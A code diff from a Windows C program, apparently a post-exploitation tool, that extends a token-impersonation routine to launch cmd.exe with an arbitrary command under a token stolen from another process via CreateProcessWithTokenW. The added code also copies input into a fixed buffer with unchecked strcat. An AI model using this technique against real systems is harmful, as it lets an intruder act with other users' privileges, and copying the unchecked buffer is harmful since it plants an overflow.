@@ -251,7 +251,30 @@ HANDLE getPrimaryTokenFromProcess(DWORD processId) {
     return hPrimaryToken; // Return the primary token handle
 }
 
-char *impersonate(int pid){
+WCHAR* convertToWCHAR(const char* charArray) {
+    if (charArray == NULL) {
+        return NULL;
+    }
+
+    // Calculate the required buffer size for the WCHAR array
+    int size = MultiByteToWideChar(CP_UTF8, 0, charArray, -1, NULL, 0);
+    if (size <= 0) {
+        return NULL; // Conversion failed
+    }
+
+    // Allocate memory for the WCHAR array
+    WCHAR* wideArray = (WCHAR*)malloc(size * sizeof(WCHAR));
+    if (wideArray == NULL) {
+        return NULL; // Memory allocation failed
+    }
+
+    // Perform the actual conversion
+    MultiByteToWideChar(CP_UTF8, 0, charArray, -1, wideArray, size);
+
+    return wideArray; // Return the converted WCHAR array
+}
+
+char *impersonate(int pid, char *command){
     char *firstUser = getName();
     STARTUPINFO startupInfo;
     PROCESS_INFORMATION processInformation;
@@ -284,9 +307,14 @@ char *impersonate(int pid){
     }
 
     // Call CreateProcessWithTokenW(), print return code and error code
-    BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
+    char commandLine[1000] = "cmd.exe /k";
+    strcat(commandLine, command);
+
+    WCHAR *wideCommand = convertToWCHAR(commandLine);
+    BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, wideCommand, 0, NULL, NULL, &startupInfo, &processInformation);
     if (!createProcess)
     {
+        printf("%d", GetLastError());
         procSpawn = "[-] CreateProcessWithTokenW Return Code\r\n";
     }
 
